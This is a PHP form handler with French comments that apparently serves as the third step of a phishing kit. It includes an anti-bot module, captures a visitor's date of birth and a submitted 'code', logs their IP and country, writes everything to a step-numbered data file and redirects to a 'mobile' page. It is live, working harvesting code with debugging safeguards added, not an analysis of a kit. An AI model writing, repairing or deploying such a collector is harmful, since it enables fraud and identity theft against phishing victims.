<?php
// Toujours en haut : activer les erreurs pour comprendre les pages blanches
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Inclure tes fichiers en vérifiant leur présence
$includes = [
    '../inc/antibots.php',
    '../inc/app.php',
    '../vendor/autoload.php'
];
foreach ($includes as $file) {
    if (!file_exists($file)) {
        error_log("Fichier manquant : $file");
    } else {
        require_once $file;
    }
}

// Protection si certaines fonctions n’existent pas
if (!function_exists('fstop')) {
    function fstop() {
        error_log("Appel à fstop(), mais fonction absente");
    }
}
if (!function_exists('get_data_encrypt')) {
    function get_data_encrypt($data) {
        return json_encode($data);
    }
}
if (!function_exists('saveData')) {
    function saveData($path, $data) {
        file_put_contents($path, $data);
    }
}
if (!function_exists('visitor_country')) {
    function visitor_country() {
        return 'FR';
    }
}
if (!function_exists('visitor_countryCode')) {
    function visitor_countryCode() {
        return 'FR';
    }
}
if (!function_exists('get_ip')) {
    function get_ip() {
        return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    }
}

// Variables communes
$LSG = $_GET['lsg'] ?? '';
$ip  = get_ip();
$date = date("Y-m-d H:i:s");
$country = visitor_country();
$countryCode = visitor_countryCode();

// Log minimal pour débogage invisible
error_log("Accès à submit.php - IP: $ip - LSG: $LSG");

// Traitement principal
if (isset($_POST['dob']) && isset($_POST['code'])) {
    $dob = $_POST['dob'];
    $code = $_POST['code'];

    // Message formaté
    $msg = "\nDOB : $dob\nCODE : $code\n----------------------\nIP: $ip - $country [$countryCode]\n$date\n";

    // Sauvegarde cryptée
    $data_enc = get_data_encrypt(['dob' => $dob, 'code' => $code, 'ip' => $ip, 'date' => $date]);
    saveData("../data/step3.txt", $data_enc);

    // Redirection propre
    header("Location: mobile.php?lsg=" . urlencode($LSG));
    exit;
} else {
    // Si accès direct sans POST → rediriger ou afficher erreur
    error_log("Accès direct à submit.php sans POST");
    header("Location: index.php?lsg=" . urlencode($LSG));
    exit;
}
?>
